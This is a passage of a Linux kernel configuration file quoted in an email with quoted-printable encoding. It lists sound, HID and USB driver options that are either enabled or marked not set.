> CONFIG_SND_HDA_CODEC_ALC262=3Dy
> CONFIG_SND_HDA_CODEC_ALC268=3Dy
> CONFIG_SND_HDA_CODEC_ALC269=3Dy
> CONFIG_SND_HDA_CODEC_ALC662=3Dy
> CONFIG_SND_HDA_CODEC_ALC680=3Dy
> CONFIG_SND_HDA_CODEC_ALC861=3Dy
> CONFIG_SND_HDA_CODEC_ALC861VD=3Dy
> CONFIG_SND_HDA_CODEC_ALC880=3Dy
> CONFIG_SND_HDA_CODEC_ALC882=3Dy
> CONFIG_SND_HDA_CODEC_CIRRUS=3Dy
> CONFIG_SND_HDA_CODEC_CS420X=3Dy
> CONFIG_SND_HDA_CODEC_CS421X=3Dy
> # CONFIG_SND_HDA_CODEC_CS8409 is not set
> CONFIG_SND_HDA_CODEC_HDMI=3Dy
> CONFIG_SND_HDA_CODEC_HDMI_GENERIC=3Dy
> CONFIG_SND_HDA_CODEC_HDMI_SIMPLE=3Dy
> CONFIG_SND_HDA_CODEC_HDMI_INTEL=3Dy
> # CONFIG_SND_HDA_INTEL_HDMI_SILENT_STREAM is not set
> CONFIG_SND_HDA_CODEC_HDMI_ATI=3Dy
> CONFIG_SND_HDA_CODEC_HDMI_NVIDIA=3Dy
> CONFIG_SND_HDA_CODEC_HDMI_NVIDIA_MCP=3Dy
> CONFIG_SND_HDA_CODEC_HDMI_TEGRA=3Dy
> CONFIG_SND_HDA_SCODEC_COMPONENT=3Dy
> # CONFIG_SND_HDA_SCODEC_CS35L56_I2C is not set
> # CONFIG_SND_HDA_SCODEC_CS35L56_SPI is not set
> CONFIG_SND_HDA_CORE=3Dy
> CONFIG_SND_HDA_COMPONENT=3Dy
> CONFIG_SND_HDA_I915=3Dy
> CONFIG_SND_INTEL_NHLT=3Dy
> CONFIG_SND_INTEL_DSP_CONFIG=3Dy
> CONFIG_SND_INTEL_SOUNDWIRE_ACPI=3Dy
> # end of HD-Audio
>=20
> # CONFIG_SND_SPI is not set
> CONFIG_SND_USB=3Dy
> CONFIG_SND_USB_AUDIO=3Dy
> CONFIG_SND_USB_AUDIO_MIDI_V2=3Dy
> CONFIG_SND_USB_AUDIO_USE_MEDIA_CONTROLLER=3Dy
> CONFIG_SND_USB_UA101=3Dy
> CONFIG_SND_USB_USX2Y=3Dy
> CONFIG_SND_USB_CAIAQ=3Dy
> CONFIG_SND_USB_CAIAQ_INPUT=3Dy
> CONFIG_SND_USB_US122L=3Dy
> # CONFIG_SND_USB_US144MKII is not set
> CONFIG_SND_USB_6FIRE=3Dy
> CONFIG_SND_USB_HIFACE=3Dy
> CONFIG_SND_BCD2000=3Dy
> CONFIG_SND_USB_LINE6=3Dy
> CONFIG_SND_USB_POD=3Dy
> CONFIG_SND_USB_PODHD=3Dy
> CONFIG_SND_USB_TONEPORT=3Dy
> CONFIG_SND_USB_VARIAX=3Dy
> # CONFIG_SND_FIREWIRE is not set
> CONFIG_SND_PCMCIA=3Dy
> # CONFIG_SND_VXPOCKET is not set
> # CONFIG_SND_PDAUDIOCF is not set
> CONFIG_SND_SOC=3Dy
> # CONFIG_SND_SOC_USB is not set
>=20
> #
> # Analog Devices
> #
> # CONFIG_SND_SOC_ADI_AXI_I2S is not set
> # CONFIG_SND_SOC_ADI_AXI_SPDIF is not set
> # end of Analog Devices
>=20
> #
> # AMD
> #
> # CONFIG_SND_SOC_AMD_ACP is not set
> # CONFIG_SND_SOC_AMD_ACP3x is not set
> # CONFIG_SND_SOC_AMD_RENOIR is not set
> # CONFIG_SND_SOC_AMD_ACP5x is not set
> # CONFIG_SND_SOC_AMD_ACP6x is not set
> # CONFIG_SND_AMD_ACP_CONFIG is not set
> # CONFIG_SND_SOC_AMD_ACP_COMMON is not set
> # CONFIG_SND_SOC_AMD_RPL_ACP6x is not set
> # end of AMD
>=20
> #
> # Apple
> #
> # end of Apple
>=20
> #
> # Atmel
> #
> # CONFIG_SND_SOC_MIKROE_PROTO is not set
> # end of Atmel
>=20
> #
> # Au1x
> #
> # end of Au1x
>=20
> #
> # Broadcom
> #
> # CONFIG_SND_BCM63XX_I2S_WHISTLER is not set
> # end of Broadcom
>=20
> #
> # Cirrus Logic
> #
> # end of Cirrus Logic
>=20
> #
> # DesignWare
> #
> # CONFIG_SND_DESIGNWARE_I2S is not set
> # end of DesignWare
>=20
> #
> # Freescale
> #
>=20
> #
> # Common SoC Audio options for Freescale CPUs:
> #
> # CONFIG_SND_SOC_FSL_ASRC is not set
> # CONFIG_SND_SOC_FSL_SAI is not set
> # CONFIG_SND_SOC_FSL_AUDMIX is not set
> # CONFIG_SND_SOC_FSL_SSI is not set
> # CONFIG_SND_SOC_FSL_SPDIF is not set
> # CONFIG_SND_SOC_FSL_ESAI is not set
> # CONFIG_SND_SOC_FSL_MICFIL is not set
> # CONFIG_SND_SOC_FSL_XCVR is not set
> # CONFIG_SND_SOC_IMX_AUDMUX is not set
> # end of Freescale
>=20
> #
> # Google
> #
> # CONFIG_SND_SOC_CHV3_I2S is not set
> # end of Google
>=20
> #
> # Hisilicon
> #
> # CONFIG_SND_I2S_HI6210_I2S is not set
> # end of Hisilicon
>=20
> #
> # JZ4740
> #
> # end of JZ4740
>=20
> #
> # Kirkwood
> #
> # end of Kirkwood
>=20
> #
> # Loongson
> #
> # end of Loongson
>=20
> #
> # Intel
> #
> # CONFIG_SND_SOC_INTEL_SST_TOPLEVEL is not set
> # CONFIG_SND_SOC_INTEL_AVS is not set
> # end of Intel
>=20
> #
> # Mediatek
> #
> # CONFIG_SND_SOC_MTK_BTCVSD is not set
> # end of Mediatek
>=20
> #
> # PXA
> #
> # end of PXA
>=20
> #
> # SoundWire (SDCA)
> #
> CONFIG_SND_SOC_SDCA_OPTIONAL=3Dy
> # end of SoundWire (SDCA)
>=20
> #
> # ST SPEAr
> #
> # end of ST SPEAr
>=20
> #
> # Spreadtrum
> #
> # end of Spreadtrum
>=20
> #
> # STMicroelectronics STM32
> #
> # end of STMicroelectronics STM32
>=20
> #
> # Tegra
> #
> # end of Tegra
>=20
> #
> # Xilinx
> #
> # CONFIG_SND_SOC_XILINX_I2S is not set
> # CONFIG_SND_SOC_XILINX_AUDIO_FORMATTER is not set
> # CONFIG_SND_SOC_XILINX_SPDIF is not set
> # end of Xilinx
>=20
> #
> # Xtensa
> #
> # CONFIG_SND_SOC_XTFPGA_I2S is not set
> # end of Xtensa
>=20
> # CONFIG_SND_SOC_SOF_TOPLEVEL is not set
> CONFIG_SND_SOC_I2C_AND_SPI=3Dy
>=20
> #
> # CODEC drivers
> #
> # CONFIG_SND_SOC_AC97_CODEC is not set
> # CONFIG_SND_SOC_ADAU1372_I2C is not set
> # CONFIG_SND_SOC_ADAU1372_SPI is not set
> # CONFIG_SND_SOC_ADAU1373 is not set
> # CONFIG_SND_SOC_ADAU1701 is not set
> # CONFIG_SND_SOC_ADAU1761_I2C is not set
> # CONFIG_SND_SOC_ADAU1761_SPI is not set
> # CONFIG_SND_SOC_ADAU7002 is not set
> # CONFIG_SND_SOC_ADAU7118_HW is not set
> # CONFIG_SND_SOC_ADAU7118_I2C is not set
> # CONFIG_SND_SOC_AK4104 is not set
> # CONFIG_SND_SOC_AK4118 is not set
> # CONFIG_SND_SOC_AK4375 is not set
> # CONFIG_SND_SOC_AK4458 is not set
> # CONFIG_SND_SOC_AK4554 is not set
> # CONFIG_SND_SOC_AK4613 is not set
> # CONFIG_SND_SOC_AK4619 is not set
> # CONFIG_SND_SOC_AK4642 is not set
> # CONFIG_SND_SOC_AK5386 is not set
> # CONFIG_SND_SOC_AK5558 is not set
> # CONFIG_SND_SOC_ALC5623 is not set
> # CONFIG_SND_SOC_AUDIO_IIO_AUX is not set
> # CONFIG_SND_SOC_AW8738 is not set
> # CONFIG_SND_SOC_AW88395 is not set
> # CONFIG_SND_SOC_AW88166 is not set
> # CONFIG_SND_SOC_AW88261 is not set
> # CONFIG_SND_SOC_AW88081 is not set
> # CONFIG_SND_SOC_AW87390 is not set
> # CONFIG_SND_SOC_AW88399 is not set
> # CONFIG_SND_SOC_BD28623 is not set
> # CONFIG_SND_SOC_BT_SCO is not set
> # CONFIG_SND_SOC_CHV3_CODEC is not set
> # CONFIG_SND_SOC_CS35L32 is not set
> # CONFIG_SND_SOC_CS35L33 is not set
> # CONFIG_SND_SOC_CS35L34 is not set
> # CONFIG_SND_SOC_CS35L35 is not set
> # CONFIG_SND_SOC_CS35L36 is not set
> # CONFIG_SND_SOC_CS35L41_SPI is not set
> # CONFIG_SND_SOC_CS35L41_I2C is not set
> # CONFIG_SND_SOC_CS35L45_SPI is not set
> # CONFIG_SND_SOC_CS35L45_I2C is not set
> # CONFIG_SND_SOC_CS35L56_I2C is not set
> # CONFIG_SND_SOC_CS35L56_SPI is not set
> # CONFIG_SND_SOC_CS35L56_SDW is not set
> # CONFIG_SND_SOC_CS42L42 is not set
> # CONFIG_SND_SOC_CS42L42_SDW is not set
> # CONFIG_SND_SOC_CS42L51_I2C is not set
> # CONFIG_SND_SOC_CS42L52 is not set
> # CONFIG_SND_SOC_CS42L56 is not set
> # CONFIG_SND_SOC_CS42L73 is not set
> # CONFIG_SND_SOC_CS42L83 is not set
> # CONFIG_SND_SOC_CS42L84 is not set
> # CONFIG_SND_SOC_CS4234 is not set
> # CONFIG_SND_SOC_CS4265 is not set
> # CONFIG_SND_SOC_CS4270 is not set
> # CONFIG_SND_SOC_CS4271_I2C is not set
> # CONFIG_SND_SOC_CS4271_SPI is not set
> # CONFIG_SND_SOC_CS42XX8_I2C is not set
> # CONFIG_SND_SOC_CS43130 is not set
> # CONFIG_SND_SOC_CS4341 is not set
> # CONFIG_SND_SOC_CS4349 is not set
> # CONFIG_SND_SOC_CS48L32 is not set
> # CONFIG_SND_SOC_CS53L30 is not set
> # CONFIG_SND_SOC_CS530X_I2C is not set
> # CONFIG_SND_SOC_CS530X_SPI is not set
> # CONFIG_SND_SOC_CX2072X is not set
> # CONFIG_SND_SOC_DA7213 is not set
> # CONFIG_SND_SOC_DMIC is not set
> # CONFIG_SND_SOC_ES7134 is not set
> # CONFIG_SND_SOC_ES7241 is not set
> # CONFIG_SND_SOC_ES8311 is not set
> # CONFIG_SND_SOC_ES8316 is not set
> # CONFIG_SND_SOC_ES8323 is not set
> # CONFIG_SND_SOC_ES8326 is not set
> # CONFIG_SND_SOC_ES8328_I2C is not set
> # CONFIG_SND_SOC_ES8328_SPI is not set
> # CONFIG_SND_SOC_ES8375 is not set
> # CONFIG_SND_SOC_ES8389 is not set
> # CONFIG_SND_SOC_FS210X is not set
> # CONFIG_SND_SOC_GTM601 is not set
> # CONFIG_SND_SOC_HDA is not set
> # CONFIG_SND_SOC_ICS43432 is not set
> # CONFIG_SND_SOC_IDT821034 is not set
> # CONFIG_SND_SOC_MAX98088 is not set
> # CONFIG_SND_SOC_MAX98090 is not set
> # CONFIG_SND_SOC_MAX98357A is not set
> # CONFIG_SND_SOC_MAX98504 is not set
> # CONFIG_SND_SOC_MAX9867 is not set
> # CONFIG_SND_SOC_MAX98927 is not set
> # CONFIG_SND_SOC_MAX98520 is not set
> # CONFIG_SND_SOC_MAX98363 is not set
> # CONFIG_SND_SOC_MAX98373_I2C is not set
> # CONFIG_SND_SOC_MAX98373_SDW is not set
> # CONFIG_SND_SOC_MAX98388 is not set
> # CONFIG_SND_SOC_MAX98390 is not set
> # CONFIG_SND_SOC_MAX98396 is not set
> # CONFIG_SND_SOC_MAX9860 is not set
> # CONFIG_SND_SOC_MSM8916_WCD_DIGITAL is not set
> # CONFIG_SND_SOC_PCM1681 is not set
> # CONFIG_SND_SOC_PCM1754 is not set
> # CONFIG_SND_SOC_PCM1789_I2C is not set
> # CONFIG_SND_SOC_PCM179X_I2C is not set
> # CONFIG_SND_SOC_PCM179X_SPI is not set
> # CONFIG_SND_SOC_PCM186X_I2C is not set
> # CONFIG_SND_SOC_PCM186X_SPI is not set
> # CONFIG_SND_SOC_PCM3060_I2C is not set
> # CONFIG_SND_SOC_PCM3060_SPI is not set
> # CONFIG_SND_SOC_PCM3168A_I2C is not set
> # CONFIG_SND_SOC_PCM3168A_SPI is not set
> # CONFIG_SND_SOC_PCM5102A is not set
> # CONFIG_SND_SOC_PCM512x_I2C is not set
> # CONFIG_SND_SOC_PCM512x_SPI is not set
> # CONFIG_SND_SOC_PCM6240 is not set
> # CONFIG_SND_SOC_PEB2466 is not set
> # CONFIG_SND_SOC_PM4125_SDW is not set
> # CONFIG_SND_SOC_RT1017_SDCA_SDW is not set
> # CONFIG_SND_SOC_RT1308_SDW is not set
> # CONFIG_SND_SOC_RT1316_SDW is not set
> # CONFIG_SND_SOC_RT1318_SDW is not set
> # CONFIG_SND_SOC_RT1320_SDW is not set
> # CONFIG_SND_SOC_RT5575 is not set
> # CONFIG_SND_SOC_RT5616 is not set
> # CONFIG_SND_SOC_RT5631 is not set
> # CONFIG_SND_SOC_RT5640 is not set
> # CONFIG_SND_SOC_RT5659 is not set
> # CONFIG_SND_SOC_RT5682_SDW is not set
> # CONFIG_SND_SOC_RT700_SDW is not set
> # CONFIG_SND_SOC_RT711_SDW is not set
> # CONFIG_SND_SOC_RT711_SDCA_SDW is not set
> # CONFIG_SND_SOC_RT712_SDCA_SDW is not set
> # CONFIG_SND_SOC_RT712_SDCA_DMIC_SDW is not set
> # CONFIG_SND_SOC_RT721_SDCA_SDW is not set
> # CONFIG_SND_SOC_RT722_SDCA_SDW is not set
> # CONFIG_SND_SOC_RT715_SDW is not set
> # CONFIG_SND_SOC_RT715_SDCA_SDW is not set
> # CONFIG_SND_SOC_RT9120 is not set
> # CONFIG_SND_SOC_RT9123 is not set
> # CONFIG_SND_SOC_RT9123P is not set
> # CONFIG_SND_SOC_RTQ9124 is not set
> # CONFIG_SND_SOC_RTQ9128 is not set
> # CONFIG_SND_SOC_SDW_MOCKUP is not set
> # CONFIG_SND_SOC_SGTL5000 is not set
> # CONFIG_SND_SOC_SIMPLE_AMPLIFIER is not set
> # CONFIG_SND_SOC_SIMPLE_MUX is not set
> # CONFIG_SND_SOC_SMA1303 is not set
> # CONFIG_SND_SOC_SMA1307 is not set
> # CONFIG_SND_SOC_SPDIF is not set
> # CONFIG_SND_SOC_SRC4XXX_I2C is not set
> # CONFIG_SND_SOC_SSM2305 is not set
> # CONFIG_SND_SOC_SSM2518 is not set
> # CONFIG_SND_SOC_SSM2602_SPI is not set
> # CONFIG_SND_SOC_SSM2602_I2C is not set
> # CONFIG_SND_SOC_SSM3515 is not set
> # CONFIG_SND_SOC_SSM4567 is not set
> # CONFIG_SND_SOC_STA32X is not set
> # CONFIG_SND_SOC_STA350 is not set
> # CONFIG_SND_SOC_STI_SAS is not set
> # CONFIG_SND_SOC_TAS2552 is not set
> # CONFIG_SND_SOC_TAS2562 is not set
> # CONFIG_SND_SOC_TAS2764 is not set
> # CONFIG_SND_SOC_TAS2770 is not set
> # CONFIG_SND_SOC_TAS2780 is not set
> # CONFIG_SND_SOC_TAS2781_I2C is not set
> # CONFIG_SND_SOC_TAS5086 is not set
> # CONFIG_SND_SOC_TAS571X is not set
> # CONFIG_SND_SOC_TAS5720 is not set
> # CONFIG_SND_SOC_TAS5805M is not set
> # CONFIG_SND_SOC_TAS6424 is not set
> # CONFIG_SND_SOC_TDA7419 is not set
> # CONFIG_SND_SOC_TFA9879 is not set
> # CONFIG_SND_SOC_TFA989X is not set
> # CONFIG_SND_SOC_TLV320ADC3XXX is not set
> # CONFIG_SND_SOC_TLV320AIC23_I2C is not set
> # CONFIG_SND_SOC_TLV320AIC23_SPI is not set
> # CONFIG_SND_SOC_TLV320AIC31XX is not set
> # CONFIG_SND_SOC_TLV320AIC32X4_I2C is not set
> # CONFIG_SND_SOC_TLV320AIC32X4_SPI is not set
> # CONFIG_SND_SOC_TLV320AIC3X_I2C is not set
> # CONFIG_SND_SOC_TLV320AIC3X_SPI is not set
> # CONFIG_SND_SOC_TLV320ADCX140 is not set
> # CONFIG_SND_SOC_TS3A227E is not set
> # CONFIG_SND_SOC_TSCS42XX is not set
> # CONFIG_SND_SOC_TSCS454 is not set
> # CONFIG_SND_SOC_UDA1334 is not set
> # CONFIG_SND_SOC_UDA1342 is not set
> # CONFIG_SND_SOC_WCD937X_SDW is not set
> # CONFIG_SND_SOC_WCD938X_SDW is not set
> # CONFIG_SND_SOC_WCD939X_SDW is not set
> # CONFIG_SND_SOC_WM8510 is not set
> # CONFIG_SND_SOC_WM8523 is not set
> # CONFIG_SND_SOC_WM8524 is not set
> # CONFIG_SND_SOC_WM8580 is not set
> # CONFIG_SND_SOC_WM8711 is not set
> # CONFIG_SND_SOC_WM8728 is not set
> # CONFIG_SND_SOC_WM8731_I2C is not set
> # CONFIG_SND_SOC_WM8731_SPI is not set
> # CONFIG_SND_SOC_WM8737 is not set
> # CONFIG_SND_SOC_WM8741 is not set
> # CONFIG_SND_SOC_WM8750 is not set
> # CONFIG_SND_SOC_WM8753 is not set
> # CONFIG_SND_SOC_WM8770 is not set
> # CONFIG_SND_SOC_WM8776 is not set
> # CONFIG_SND_SOC_WM8782 is not set
> # CONFIG_SND_SOC_WM8804_I2C is not set
> # CONFIG_SND_SOC_WM8804_SPI is not set
> # CONFIG_SND_SOC_WM8903 is not set
> # CONFIG_SND_SOC_WM8904 is not set
> # CONFIG_SND_SOC_WM8940 is not set
> # CONFIG_SND_SOC_WM8960 is not set
> # CONFIG_SND_SOC_WM8961 is not set
> # CONFIG_SND_SOC_WM8962 is not set
> # CONFIG_SND_SOC_WM8974 is not set
> # CONFIG_SND_SOC_WM8978 is not set
> # CONFIG_SND_SOC_WM8985 is not set
> # CONFIG_SND_SOC_WSA881X is not set
> # CONFIG_SND_SOC_WSA883X is not set
> # CONFIG_SND_SOC_WSA884X is not set
> # CONFIG_SND_SOC_ZL38060 is not set
> # CONFIG_SND_SOC_MAX9759 is not set
> # CONFIG_SND_SOC_MT6351 is not set
> # CONFIG_SND_SOC_MT6357 is not set
> # CONFIG_SND_SOC_MT6358 is not set
> # CONFIG_SND_SOC_MT6660 is not set
> # CONFIG_SND_SOC_NAU8315 is not set
> # CONFIG_SND_SOC_NAU8325 is not set
> # CONFIG_SND_SOC_NAU8540 is not set
> # CONFIG_SND_SOC_NAU8810 is not set
> # CONFIG_SND_SOC_NAU8821 is not set
> # CONFIG_SND_SOC_NAU8822 is not set
> # CONFIG_SND_SOC_NAU8824 is not set
> # CONFIG_SND_SOC_NTP8918 is not set
> # CONFIG_SND_SOC_NTP8835 is not set
> # CONFIG_SND_SOC_TPA6130A2 is not set
> # CONFIG_SND_SOC_LPASS_WSA_MACRO is not set
> # CONFIG_SND_SOC_LPASS_VA_MACRO is not set
> # CONFIG_SND_SOC_LPASS_RX_MACRO is not set
> # CONFIG_SND_SOC_LPASS_TX_MACRO is not set
> # end of CODEC drivers
>=20
> #
> # Generic drivers
> #
> # CONFIG_SND_SIMPLE_CARD is not set
> # CONFIG_SND_AUDIO_GRAPH_CARD is not set
> # CONFIG_SND_AUDIO_GRAPH_CARD2 is not set
> # CONFIG_SND_TEST_COMPONENT is not set
> # end of Generic drivers
>=20
> CONFIG_SND_X86=3Dy
> # CONFIG_HDMI_LPE_AUDIO is not set
> CONFIG_SND_VIRTIO=3Dy
> CONFIG_HID_SUPPORT=3Dy
> CONFIG_HID=3Dy
> CONFIG_HID_BATTERY_STRENGTH=3Dy
> CONFIG_HIDRAW=3Dy
> CONFIG_UHID=3Dy
> CONFIG_HID_GENERIC=3Dy
> # CONFIG_HID_HAPTIC is not set
>=20
> #
> # Special HID drivers
> #
> CONFIG_HID_A4TECH=3Dy
> CONFIG_HID_ACCUTOUCH=3Dy
> CONFIG_HID_ACRUX=3Dy
> CONFIG_HID_ACRUX_FF=3Dy
> CONFIG_HID_APPLE=3Dy
> CONFIG_HID_APPLEIR=3Dy
> # CONFIG_HID_APPLETB_BL is not set
> # CONFIG_HID_APPLETB_KBD is not set
> CONFIG_HID_ASUS=3Dy
> CONFIG_HID_AUREAL=3Dy
> CONFIG_HID_BELKIN=3Dy
> CONFIG_HID_BETOP_FF=3Dy
> CONFIG_HID_BIGBEN_FF=3Dy
> CONFIG_HID_CHERRY=3Dy
> CONFIG_HID_CHICONY=3Dy
> CONFIG_HID_CORSAIR=3Dy
> CONFIG_HID_COUGAR=3Dy
> CONFIG_HID_MACALLY=3Dy
> CONFIG_HID_PRODIKEYS=3Dy
> CONFIG_HID_CMEDIA=3Dy
> CONFIG_HID_CP2112=3Dy
> CONFIG_HID_CREATIVE_SB0540=3Dy
> CONFIG_HID_CYPRESS=3Dy
> CONFIG_HID_DRAGONRISE=3Dy
> CONFIG_DRAGONRISE_FF=3Dy
> CONFIG_HID_EMS_FF=3Dy
> CONFIG_HID_ELAN=3Dy
> CONFIG_HID_ELECOM=3Dy
> CONFIG_HID_ELO=3Dy
> CONFIG_HID_EVISION=3Dy
> CONFIG_HID_EZKEY=3Dy
> CONFIG_HID_FT260=3Dy
> CONFIG_HID_GEMBIRD=3Dy
> CONFIG_HID_GFRM=3Dy
> CONFIG_HID_GLORIOUS=3Dy
> CONFIG_HID_HOLTEK=3Dy
> CONFIG_HOLTEK_FF=3Dy
> CONFIG_HID_VIVALDI_COMMON=3Dy
> # CONFIG_HID_GOODIX_SPI is not set
> CONFIG_HID_GOOGLE_STADIA_FF=3Dy
> CONFIG_HID_VIVALDI=3Dy
> CONFIG_HID_GT683R=3Dy
> CONFIG_HID_KEYTOUCH=3Dy
> CONFIG_HID_KYE=3Dy
> # CONFIG_HID_KYSONA is not set
> CONFIG_HID_UCLOGIC=3Dy
> CONFIG_HID_WALTOP=3Dy
> CONFIG_HID_VIEWSONIC=3Dy
> CONFIG_HID_VRC2=3Dy
> CONFIG_HID_XIAOMI=3Dy
> CONFIG_HID_GYRATION=3Dy
> CONFIG_HID_ICADE=3Dy
> CONFIG_HID_ITE=3Dy
> CONFIG_HID_JABRA=3Dy
> CONFIG_HID_TWINHAN=3Dy
> CONFIG_HID_KENSINGTON=3Dy
> CONFIG_HID_LCPOWER=3Dy
> CONFIG_HID_LED=3Dy
> CONFIG_HID_LENOVO=3Dy
> CONFIG_HID_LETSKETCH=3Dy
> CONFIG_HID_LOGITECH=3Dy
> CONFIG_HID_LOGITECH_DJ=3Dy
> CONFIG_HID_LOGITECH_HIDPP=3Dy
> CONFIG_LOGITECH_FF=3Dy
> CONFIG_LOGIRUMBLEPAD2_FF=3Dy
> CONFIG_LOGIG940_FF=3Dy
> CONFIG_LOGIWHEELS_FF=3Dy
> CONFIG_HID_MAGICMOUSE=3Dy
> CONFIG_HID_MALTRON=3Dy
> CONFIG_HID_MAYFLASH=3Dy
> CONFIG_HID_MEGAWORLD_FF=3Dy
> CONFIG_HID_REDRAGON=3Dy
> CONFIG_HID_MICROSOFT=3Dy
> CONFIG_HID_MONTEREY=3Dy
> CONFIG_HID_MULTITOUCH=3Dy
> CONFIG_HID_NINTENDO=3Dy
> CONFIG_NINTENDO_FF=3Dy
> CONFIG_HID_NTI=3Dy
> CONFIG_HID_NTRIG=3Dy
> CONFIG_HID_NVIDIA_SHIELD=3Dy
> CONFIG_NVIDIA_SHIELD_FF=3Dy
> CONFIG_HID_ORTEK=3Dy
> CONFIG_HID_PANTHERLORD=3Dy
> CONFIG_PANTHERLORD_FF=3Dy
> CONFIG_HID_PENMOUNT=3Dy
> CONFIG_HID_PETALYNX=3Dy
> CONFIG_HID_PICOLCD=3Dy
> CONFIG_HID_PICOLCD_FB=3Dy
> CONFIG_HID_PICOLCD_BACKLIGHT=3Dy
> CONFIG_HID_PICOLCD_LCD=3Dy
> CONFIG_HID_PICOLCD_LEDS=3Dy
> CONFIG_HID_PICOLCD_CIR=3Dy
> CONFIG_HID_PLANTRONICS=3Dy
> CONFIG_HID_PLAYSTATION=3Dy
> CONFIG_PLAYSTATION_FF=3Dy
> CONFIG_HID_PXRC=3Dy
> # CONFIG_HID_RAPOO is not set
> CONFIG_HID_RAZER=3Dy
> CONFIG_HID_PRIMAX=3Dy
> CONFIG_HID_RETRODE=3Dy
> CONFIG_HID_ROCCAT=3Dy
> CONFIG_HID_SAITEK=3Dy
> CONFIG_HID_SAMSUNG=3Dy
> CONFIG_HID_SEMITEK=3Dy
> CONFIG_HID_SIGMAMICRO=3Dy
> CONFIG_HID_SONY=3Dy
> CONFIG_SONY_FF=3Dy
> CONFIG_HID_SPEEDLINK=3Dy
> CONFIG_HID_STEAM=3Dy
> CONFIG_STEAM_FF=3Dy
> CONFIG_HID_STEELSERIES=3Dy
> CONFIG_HID_SUNPLUS=3Dy
> CONFIG_HID_RMI=3Dy
> CONFIG_HID_GREENASIA=3Dy
> CONFIG_GREENASIA_FF=3Dy
> CONFIG_HID_SMARTJOYPLUS=3Dy
> CONFIG_SMARTJOYPLUS_FF=3Dy
> CONFIG_HID_TIVO=3Dy
> CONFIG_HID_TOPSEED=3Dy
> CONFIG_HID_TOPRE=3Dy
> CONFIG_HID_THINGM=3Dy
> CONFIG_HID_THRUSTMASTER=3Dy
> CONFIG_THRUSTMASTER_FF=3Dy
> CONFIG_HID_UDRAW_PS3=3Dy
> CONFIG_HID_U2FZERO=3Dy
> # CONFIG_HID_UNIVERSAL_PIDFF is not set
> CONFIG_HID_WACOM=3Dy
> CONFIG_HID_WIIMOTE=3Dy
> # CONFIG_HID_WINWING is not set
> CONFIG_HID_XINMO=3Dy
> CONFIG_HID_ZEROPLUS=3Dy
> CONFIG_ZEROPLUS_FF=3Dy
> CONFIG_HID_ZYDACRON=3Dy
> CONFIG_HID_SENSOR_HUB=3Dy
> CONFIG_HID_SENSOR_CUSTOM_SENSOR=3Dy
> CONFIG_HID_ALPS=3Dy
> CONFIG_HID_MCP2200=3Dy
> CONFIG_HID_MCP2221=3Dy
> # end of Special HID drivers
>=20
> #
> # HID-BPF support
> #
> # CONFIG_HID_BPF is not set
> # end of HID-BPF support
>=20
> CONFIG_I2C_HID=3Dy
> CONFIG_I2C_HID_ACPI=3Dy
> CONFIG_I2C_HID_OF=3Dy
> # CONFIG_I2C_HID_OF_ELAN is not set
> # CONFIG_I2C_HID_OF_GOODIX is not set
> CONFIG_I2C_HID_CORE=3Dy
>=20
> #
> # Intel ISH HID support
> #
> CONFIG_INTEL_ISH_HID=3Dy
> CONFIG_INTEL_ISH_FIRMWARE_DOWNLOADER=3Dy
> # end of Intel ISH HID support
>=20
> #
> # AMD SFH HID Support
> #
> CONFIG_AMD_SFH_HID=3Dy
> # end of AMD SFH HID Support
>=20
> #
> # Surface System Aggregator Module HID support
> #
> CONFIG_SURFACE_HID=3Dy
> CONFIG_SURFACE_KBD=3Dy
> # end of Surface System Aggregator Module HID support
>=20
> CONFIG_SURFACE_HID_CORE=3Dy
>=20
> #
> # Intel THC HID Support
> #
> # CONFIG_INTEL_THC_HID is not set
> # end of Intel THC HID Support
>=20
> #
> # USB HID support
> #
> CONFIG_USB_HID=3Dy
> CONFIG_HID_PID=3Dy
> CONFIG_USB_HIDDEV=3Dy
> # end of USB HID support
>=20
> CONFIG_USB_OHCI_LITTLE_ENDIAN=3Dy
> CONFIG_USB_SUPPORT=3Dy
> CONFIG_USB_COMMON=3Dy
> CONFIG_USB_LED_TRIG=3Dy
> CONFIG_USB_ULPI_BUS=3Dy
> CONFIG_USB_CONN_GPIO=3Dy
> CONFIG_USB_ARCH_HAS_HCD=3Dy
> CONFIG_USB=3Dy
> CONFIG_USB_PCI=3Dy
> CONFIG_USB_PCI_AMD=3Dy
> CONFIG_USB_ANNOUNCE_NEW_DEVICES=3Dy
>=20
> #
> # Miscellaneous USB options
> #
> CONFIG_USB_DEFAULT_PERSIST=3Dy
> CONFIG_USB_FEW_INIT_RETRIES=3Dy
> CONFIG_USB_DYNAMIC_MINORS=3Dy
> CONFIG_USB_OTG=3Dy
> # CONFIG_USB_OTG_PRODUCTLIST is not set
> # CONFIG_USB_OTG_DISABLE_EXTERNAL_HUB is not set
> CONFIG_USB_OTG_FSM=3Dy
> CONFIG_USB_LEDS_TRIGGER_USBPORT=3Dy
> CONFIG_USB_AUTOSUSPEND_DELAY=3D2
> CONFIG_USB_DEFAULT_AUTHORIZATION_MODE=3D1
> CONFIG_USB_MON=3Dy
>=20
> #
> # USB Host Controller Drivers
> #
> CONFIG_USB_C67X00_HCD=3Dy
> CONFIG_USB_XHCI_HCD=3Dy
> CONFIG_USB_XHCI_DBGCAP=3Dy
> CONFIG_USB_XHCI_PCI=3Dy
> CONFIG_USB_XHCI_PCI_RENESAS=3Dy
> CONFIG_USB_XHCI_PLATFORM=3Dy
> # CONFIG_USB_XHCI_SIDEBAND is not set
> CONFIG_USB_EHCI_HCD=3Dy
> CONFIG_USB_EHCI_ROOT_HUB_TT=3Dy
> CONFIG_USB_EHCI_TT_NEWSCHED=3Dy
> CONFIG_USB_EHCI_PCI=3Dy
> CONFIG_USB_EHCI_FSL=3Dy
> CONFIG_USB_EHCI_HCD_PLATFORM=3Dy
> CONFIG_USB_OXU210HP_HCD=3Dy
> CONFIG_USB_ISP116X_HCD=3Dy
> CONFIG_USB_MAX3421_HCD=3Dy
> CONFIG_USB_OHCI_HCD=3Dy
> CONFIG_USB_OHCI_HCD_PCI=3Dy
> # CONFIG_USB_OHCI_HCD_SSB is not set
> CONFIG_USB_OHCI_HCD_PLATFORM=3Dy
> CONFIG_USB_UHCI_HCD=3Dy
> CONFIG_USB_SL811_HCD=3Dy
> CONFIG_USB_SL811_HCD_ISO=3Dy
> CONFIG_USB_SL811_CS=3Dy
> CONFIG_USB_R8A66597_HCD=3Dy
> CONFIG_USB_HCD_BCMA=3Dy
> CONFIG_USB_HCD_SSB=3Dy
> # CONFIG_USB_HCD_TEST_MODE is not set
>=20
> #
> # USB Device Class drivers
> #
> CONFIG_USB_ACM=3Dy
